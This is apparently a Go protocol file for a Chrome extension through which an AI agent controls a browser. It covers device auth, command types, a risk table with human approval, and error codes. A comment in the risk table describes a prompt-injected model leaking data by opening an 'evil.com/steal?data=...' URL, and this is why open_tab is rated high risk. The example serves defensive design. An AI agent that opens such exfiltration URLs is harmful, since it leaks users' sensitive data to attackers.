// Package browser 实现浏览器执行端（Chrome 扩展 lead-mind-ai-plugin）的
// 服务端对接：设备配对、WebSocket 反向通道、以及把浏览器指令暴露给 Agent
// 调用的下发接口。
//
// ★★ 本文件是跨仓库契约 ★★
//
// 对应插件侧 lead-mind-ai-plugin/src/shared/protocol.ts。**任何字段改动都
// 必须同步修改插件侧**，否则两端会静默地互相解析失败——JSON 反序列化遇到
// 不认识的字段不会报错，只会得到零值。
//
// 协议设计说明见插件仓库 DESIGN.md §3。
package browser

import "time"

// ProtocolVersion 是当前协议版本，对应 protocol.ts 的 PROTOCOL_VERSION。
// 不兼容变更时递增，服务端据此拒绝过旧的插件。
const ProtocolVersion = 1

// MessageKind 是信封的消息类型。
type MessageKind string

const (
	KindAuth    MessageKind = "auth"
	KindAuthOK  MessageKind = "auth_ok"
	KindAuthErr MessageKind = "auth_err"
	KindPing    MessageKind = "ping"
	KindPong    MessageKind = "pong"
	KindCommand MessageKind = "command"
	KindAck     MessageKind = "ack"
	KindResult  MessageKind = "result"
	KindEvent   MessageKind = "event"
	KindCancel  MessageKind = "cancel"
)

// Envelope 是所有消息共享的信封。Payload 保持为 json.RawMessage 的替代
// 形式（any），由各 kind 各自解析——见 decodePayload。
type Envelope struct {
	V       int         `json:"v"`
	ID      string      `json:"id"`
	TS      string      `json:"ts"`
	Kind    MessageKind `json:"kind"`
	Payload any         `json:"payload"`
}

// RFC3339Milli 是协议约定的时间格式：带时区偏移量的完整时间值。
//
// 对齐 PROJECT.md §6.6——带偏移的时间可以安全地跨时区比较，不依赖接收方
// 的进程时区。插件侧 nowRFC3339() 产生的也是这个形状。
const RFC3339Milli = "2006-01-02T15:04:05.000Z07:00"

// nowTS 返回协议格式的当前时间戳。
func nowTS() string {
	return time.Now().Format(RFC3339Milli)
}

// ---------------------------------------------------------------------------
// 认证握手
// ---------------------------------------------------------------------------

// AuthPayload 是插件在连接建立后发来的第一帧。
//
// 认证走首帧而不是 Authorization header，是因为浏览器原生 WebSocket 构造器
// 不支持自定义 header；也刻意不走 URL query，避免 device_token 被写进本服务
// 或中间网关的 access log（插件 DESIGN.md §3.1）。
type AuthPayload struct {
	DeviceToken string `json:"device_token"`
	// Capabilities 是插件支持的指令列表，用于能力协商：服务端不应下发插件
	// 声明不支持的指令。
	Capabilities  []string `json:"capabilities"`
	PluginVersion string   `json:"plugin_version"`
	UserAgent     string   `json:"user_agent"`
}

// AuthOKPayload 是认证成功的响应。
type AuthOKPayload struct {
	DeviceID   string `json:"device_id"`
	TenantCode string `json:"tenant_code"`
	UserID     string `json:"user_id"`
	// Allowlist 是服务端侧的域名白名单。插件仍会用本地缓存独立校验并取交集
	// ——服务端被攻破时不能靠它自证清白（插件 DESIGN.md §7.2）。
	Allowlist []string `json:"allowlist,omitempty"`
	// HeartbeatMS 告诉插件期望的心跳间隔；缺省时插件用自己的默认值 20s。
	HeartbeatMS int `json:"heartbeat_ms,omitempty"`
}

// AuthErrCode 是认证失败的原因。插件收到任一种都会清除本地 token 并要求
// 重新配对，**不会重试**——重试只会一直被拒。
type AuthErrCode string

const (
	AuthErrInvalidToken       AuthErrCode = "INVALID_TOKEN"
	AuthErrTokenRevoked       AuthErrCode = "TOKEN_REVOKED"
	AuthErrTokenExpired       AuthErrCode = "TOKEN_EXPIRED"
	AuthErrVersionUnsupported AuthErrCode = "VERSION_UNSUPPORTED"
)

// AuthErrPayload 是认证失败的响应。
type AuthErrPayload struct {
	Code    AuthErrCode `json:"code"`
	Message string      `json:"message"`
}

// ---------------------------------------------------------------------------
// 指令
// ---------------------------------------------------------------------------

// CommandType 是浏览器指令的类型。与插件 protocol.ts 的 CommandType 一一对应。
type CommandType string

const (
	CmdOpenTab      CommandType = "open_tab"
	CmdCloseTab     CommandType = "close_tab"
	CmdListTabs     CommandType = "list_tabs"
	CmdActivateTab  CommandType = "activate_tab"
	CmdReadPage     CommandType = "read_page"
	CmdFindElements CommandType = "find_elements"
	CmdClick        CommandType = "click"
	CmdType         CommandType = "type"
	CmdSelect       CommandType = "select"
	CmdScroll       CommandType = "scroll"
	CmdWaitFor      CommandType = "wait_for"
	CmdExtract      CommandType = "extract"
	CmdScreenshot   CommandType = "screenshot"
	CmdGoBack       CommandType = "go_back"
	CmdGoForward    CommandType = "go_forward"
	CmdReload       CommandType = "reload"
)

// RiskLevel 是指令的风险等级。
type RiskLevel string

const (
	RiskLow  RiskLevel = "low"
	RiskHigh RiskLevel = "high"
)

// riskTable 是服务端侧的风险标注。
//
// 必须与插件 src/shared/risk.ts 保持一致，但**它不是安全边界**：插件不采信
// 本字段，会用自己硬编码的表做最终判定（插件 DESIGN.md §3.3）。这里标注的
// 意义有二：一是让审批 UI 能提前展示风险，二是与插件侧交叉校验——两边不一致
// 时插件按更严格的处理并告警，从而暴露出契约漂移。
var riskTable = map[CommandType]RiskLevel{
	CmdListTabs:     RiskLow,
	CmdActivateTab:  RiskLow,
	CmdCloseTab:     RiskLow,
	CmdReadPage:     RiskLow,
	CmdFindElements: RiskLow,
	CmdScroll:       RiskLow,
	CmdWaitFor:      RiskLow,
	CmdExtract:      RiskLow,
	CmdScreenshot:   RiskLow,
	CmdGoBack:       RiskLow,
	CmdGoForward:    RiskLow,
	CmdReload:       RiskLow,

	CmdClick:  RiskHigh,
	CmdType:   RiskHigh,
	CmdSelect: RiskHigh,
	// open_tab 看似无害，实为 prompt injection 下的数据外泄出口：被劫持的
	// 模型只要打开 evil.com/steal?data=<敏感信息> 就完成了外传。
	CmdOpenTab: RiskHigh,
}

// RiskOf 返回指令的风险等级。未登记的指令按高危处理，与插件侧的兜底一致
// ——宁可多一次审批，也不让未登记的新指令以低风险悄悄执行。
func RiskOf(t CommandType) RiskLevel {
	if r, ok := riskTable[t]; ok {
		return r
	}
	return RiskHigh
}

// Command 是下发给插件的一条指令。
type Command struct {
	// CmdID 是指令 ID：result 靠它配对，同时是插件侧的幂等键。重连导致的
	// 重发不会被重复执行（插件 DESIGN.md §3.5）。
	CmdID string         `json:"cmd_id"`
	Type  CommandType    `json:"type"`
	Args  map[string]any `json:"args"`
	// TabID 省略表示作用于当前活动 tab。
	TabID     *int      `json:"tab_id,omitempty"`
	TimeoutMS int       `json:"timeout_ms,omitempty"`
	Risk      RiskLevel `json:"risk"`
	// TraceID 贯穿服务端 OTel trace，对齐 PROJECT.md §6.3。
	TraceID string `json:"trace_id,omitempty"`
}

// CancelPayload 通知插件放弃一条尚未完成的指令。
type CancelPayload struct {
	CmdID  string `json:"cmd_id"`
	Reason string `json:"reason,omitempty"`
}

// ---------------------------------------------------------------------------
// 响应
// ---------------------------------------------------------------------------

// AckStatus 是插件收到指令后的即时回执状态。
type AckStatus string

const (
	AckAccepted        AckStatus = "accepted"
	AckPendingApproval AckStatus = "pending_approval"
)

// AckPayload 是插件的即时回执。
type AckPayload struct {
	CmdID  string    `json:"cmd_id"`
	Status AckStatus `json:"status"`
	// ApprovalTimeoutMS 在 pending_approval 时给出：服务端必须把这条指令的
	// 等待上限放宽到至少这个值，因为它在等真人点确认（可能几十秒）。
	ApprovalTimeoutMS int `json:"approval_timeout_ms,omitempty"`
}

// ErrorCode 是指令失败的原因。
type ErrorCode string

const (
	ErrElementNotFound   ErrorCode = "ELEMENT_NOT_FOUND"
	ErrElementNotVisible ErrorCode = "ELEMENT_NOT_VISIBLE"
	ErrTabNotFound       ErrorCode = "TAB_NOT_FOUND"
	ErrNavigationFailed  ErrorCode = "NAVIGATION_FAILED"
	ErrTimeout           ErrorCode = "TIMEOUT"
	ErrPermissionDenied  ErrorCode = "PERMISSION_DENIED"
	ErrUserRejected      ErrorCode = "USER_REJECTED"
	ErrApprovalTimeout   ErrorCode = "APPROVAL_TIMEOUT"
	ErrPanelClosed       ErrorCode = "PANEL_CLOSED"
	ErrRateLimited       ErrorCode = "RATE_LIMITED"
	ErrSnapshotStale     ErrorCode = "SNAPSHOT_STALE"
	ErrUnsupported       ErrorCode = "UNSUPPORTED"
	ErrCancelled         ErrorCode = "CANCELLED"
	ErrInternal          ErrorCode = "INTERNAL"
	// ErrDeviceOffline 是**服务端独有**的错误码，插件侧不会产生它：指令根本
	// 没能发出去（没有已连接的设备）。插件 protocol.ts 的 ErrorCode 联合类型
	// 里没有这一项，因为它只出现在服务端返回给模型的工具结果里，不走 WS。
	ErrDeviceOffline ErrorCode = "DEVICE_OFFLINE"
)

// ResultError 描述一次失败。
type ResultError struct {
	Code ErrorCode `json:"code"`
	// Message 是**写给模型看的**，不是写给人看的：要直接指导模型下一步怎么做，
	// 例如 "Element e17 no longer exists — call read_page again for a fresh
	// snapshot."。这是提示工程的一部分（插件 DESIGN.md §3.4）。
	Message   string `json:"message"`
	Retryable bool   `json:"retryable"`
}

// ResultPayload 是一条指令的最终执行结果。
type ResultPayload struct {
	CmdID      string       `json:"cmd_id"`
	OK         bool         `json:"ok"`
	Data       any          `json:"data,omitempty"`
	Error      *ResultError `json:"error,omitempty"`
	DurationMS int64        `json:"duration_ms"`
}

// ---------------------------------------------------------------------------
// 事件（插件主动上报）
// ---------------------------------------------------------------------------

// EventKind 是插件主动上报的事件类型。
type EventKind string

const (
	EventTabClosed     EventKind = "tab_closed"
	EventNavigated     EventKind = "navigated"
	EventDeviceBusy    EventKind = "device_busy"
	EventEmergencyStop EventKind = "emergency_stop"
)

// EventPayload 是插件主动上报的事件。
type EventPayload struct {
	Event  EventKind      `json:"event"`
	Detail map[string]any `json:"detail,omitempty"`
}
